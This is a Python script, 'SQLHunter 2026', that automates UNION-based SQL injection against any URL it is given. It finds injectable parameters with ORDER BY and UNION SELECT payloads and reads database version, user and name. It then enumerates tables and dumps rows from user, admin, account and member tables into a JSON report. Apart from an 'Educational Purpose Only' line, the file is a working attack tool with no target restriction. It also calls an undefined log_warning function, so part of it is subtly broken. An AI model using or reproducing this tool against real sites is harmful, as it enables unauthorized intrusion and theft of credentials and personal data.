#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLHunter 2026 - Smart Auto-Discovery Edition
No manual parameter selection needed. Just provide the URL.
Educational Purpose Only.
"""

import requests
import sys
import time
import re
import random
import argparse
import json
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# ========== ANSI COLORS ==========
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'

BANNER = f"""
{Colors.CYAN}{Colors.BOLD}
   ███████╗ ██████╗ ██╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
   ██╔════╝██╔═══██╗██║     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
   ███████╗██║   ██║██║     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
   ╚════██║██║▄▄ ██║██║     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
   ███████║╚██████╔╝███████╗██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
   ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{Colors.RESET}
{Colors.YELLOW}{Colors.BOLD}  ⚡ SQLHunter 2026 Smart Auto ⚡{Colors.RESET}
{Colors.GREEN}   Fully Automated Discovery & Exploitation{Colors.RESET}
"""

# ========== CONFIGURATION ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]
TIMEOUT = 10
DELAY = 0.05
OUTPUT_DIR = "SQLHunter_Reports"
os.makedirs(OUTPUT_DIR, exist_ok=True)

session = requests.Session()
session.headers.update({
    "User-Agent": random.choice(USER_AGENTS),
    "Accept": "*/*"
})

def log_info(msg): print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")
def log_success(msg): print(f"{Colors.GREEN}[✓]{Colors.RESET} {msg}")
def log_error(msg): print(f"{Colors.RED}[✗]{Colors.RESET} {msg}")

class SQLHunter:
    def __init__(self, url):
        self.url = url
        self.params = {}
        self.vulnerable_param = None
        self.col_count = 0
        self.visible_col = 0
        self.technique = None
        
        # Parse URL to get parameters automatically
        parsed = urlparse(url)
        self.base_url = urlunparse(parsed._replace(query=""))
        self.params = parse_qs(parsed.query)
        
        if not self.params:
            log_error("No parameters found in URL. Please provide a URL with query string (e.g., ?id=1).")
            sys.exit(1)
            
        log_info(f"Target URL: {url}")
        log_info(f"Parameters detected: {list(self.params.keys())}")

    def _send_test(self, param_name, injection):
        """Send a test request modifying a specific parameter"""
        test_params = {}
        for k, v in self.params.items():
            if k == param_name:
                # Take the first value if multiple, append injection
                original_val = v[0] if isinstance(v, list) else v
                test_params[k] = [original_val + injection]
            else:
                test_params[k] = v
        
        query_string = urlencode(test_params, doseq=True)
        test_url = f"{self.base_url}?{query_string}"
        
        try:
            return session.get(test_url, timeout=TIMEOUT, allow_redirects=False)
        except:
            return None

    def detect_vulnerability(self):
        """Automatically test all parameters for UNION based SQLi"""
        log_info("Starting automatic vulnerability scan on all parameters...")
        
        for param_name in self.params.keys():
            log_info(f"Testing parameter: '{param_name}'...")
            
            # 1. Find Column Count
            found_cols = False
            for i in range(1, 50):
                pl = f" ORDER BY {i}-- -"
                resp = self._send_test(param_name, pl)
                if resp and (resp.status_code == 500 or 'error' in resp.text.lower()):
                    # If error appears at i, then count is i-1
                    self.col_count = i - 1
                    found_cols = True
                    break
                elif resp and resp.status_code == 200:
                     # Sometimes ORDER BY fails silently but changes length
                     # We'll rely on the next step to confirm
                     pass
                time.sleep(DELAY)
            
            if not found_cols and self.col_count == 0:
                 # Fallback: Try up to 10 columns assuming standard behavior
                 # This is a simplified logic for demo
                 continue

            if self.col_count > 0:
                log_success(f"Potential column count found: {self.col_count} for param '{param_name}'")
                
                # 2. Find Visible Column
                for i in range(1, self.col_count + 1):
                    nulls = ["NULL"] * self.col_count
                    nulls[i - 1] = "'SQLHUNTER'"
                    pl = f" UNION SELECT {','.join(nulls)}-- -"
                    resp = self._send_test(param_name, pl)
                    
                    if resp and "SQLHUNTER" in resp.text:
                        self.visible_col = i
                        self.vulnerable_param = param_name
                        self.technique = "UNION"
                        log_success(f"VULNERABLE FOUND! Param: '{param_name}', Visible Col: {i}")
                        return True
            
            # Reset for next param
            self.col_count = 0
            
        return False

    def extract_data(self, query):
        """Extract data using the found vulnerable parameter"""
        if not self.vulnerable_param:
            return None
        
        nulls = ["NULL"] * self.col_count
        marker = "0x53514c48554e544552" # SQLHUNTER Hex
        nulls[self.visible_col - 1] = f"CONCAT({marker}, ({query}), {marker})"
        
        pl = f" UNION SELECT {','.join(nulls)}-- -"
        resp = self._send_test(self.vulnerable_param, pl)
        
        if resp:
            match = re.search(r'SQLHUNTER(.*?)SQLHUNTER', resp.text, re.DOTALL | re.IGNORECASE)
            if match:
                return match.group(1).strip()
        return None

    def auto_exploit(self):
        """Full automatic exploitation chain"""
        if not self.vulnerable_param:
            log_error("No vulnerability found to exploit.")
            return

        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        log_info(f"STARTING AUTO-EXPLOITATION on param '{self.vulnerable_param}'")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

        # 1. Get DB Info
        log_info("Fetching Database Info...")
        version = self.extract_data("VERSION()")
        user = self.extract_data("USER()")
        db = self.extract_data("DATABASE()")
        
        log_success(f"DBMS: {version}")
        log_success(f"User: {user}")
        log_success(f"Current DB: {db}")
        
        if not db:
            log_error("Could not determine database name.")
            return

        # 2. Get Tables
        log_info("Enumerating Tables...")
        tables = []
        for i in range(50):
            q = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT 1 OFFSET {i}"
            tbl = self.extract_data(q)
            if tbl:
                tables.append(tbl)
                log_success(f"Table: {tbl}")
            else:
                break
            time.sleep(DELAY)
        
        if not tables:
            log_warning("No tables found.")
            return

        # 3. Smart Dump (Look for users/admin first)
        interesting_tables = [t for t in tables if any(x in t.lower() for x in ['user', 'admin', 'account', 'member'])]
        if not interesting_tables:
            interesting_tables = tables[:3] # Default to first 3

        report_data = {"target": self.url, "vuln_param": self.vulnerable_param, "data": []}

        for tbl in interesting_tables:
            log_info(f"Dumping Table: {tbl}")
            cols = []
            for i in range(50):
                q = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{tbl}' LIMIT 1 OFFSET {i}"
                col = self.extract_data(q)
                if col:
                    cols.append(col)
                else:
                    break
                time.sleep(DELAY)
            
            if cols:
                # Dump Data
                concat_cols = ",'|',".join([f"IFNULL({c},'NULL')" for c in cols])
                rows = []
                for i in range(100):
                    q = f"SELECT CONCAT({concat_cols}) FROM {db}.{tbl} LIMIT 1 OFFSET {i}"
                    row_data = self.extract_data(q)
                    if row_data:
                        rows.append(row_data.split('|'))
                    else:
                        break
                    time.sleep(DELAY)
                
                if rows:
                    log_success(f"Dumped {len(rows)} rows from {tbl}")
                    report_data["data"].append({"table": tbl, "columns": cols, "rows": rows})
                    
                    # Print Preview
                    print(f"\n{Colors.GREEN}--- Data from {tbl} ---{Colors.RESET}")
                    print(f"{Colors.BOLD}{' | '.join(cols)}{Colors.RESET}")
                    for row in rows[:5]: print(" | ".join(row))
                    if len(rows) > 5: print("...")

        # Save Report
        filename = f"auto_report_{int(time.time())}.json"
        filepath = os.path.join(OUTPUT_DIR, filename)
        with open(filepath, "w") as f:
            json.dump(report_data, f, indent=2)
        log_success(f"Full Report Saved: {filepath}")

def main():
    parser = argparse.ArgumentParser(description="SQLHunter Smart Auto-Discovery")
    parser.add_argument("-u", "--url", required=True, help="Full URL with parameters (e.g., http://site.com/page.php?id=1)")
    
    args = parser.parse_args()
    
    if not args.url.startswith("http"):
        args.url = "http://" + args.url

    print(BANNER)
    
    # Disable SSL Warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    hunter = SQLHunter(args.url)
    
    if hunter.detect_vulnerability():
        hunter.auto_exploit()
    else:
        log_error("No UNION-based SQL injection vulnerability found in any parameter.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Exiting.{Colors.RESET}")
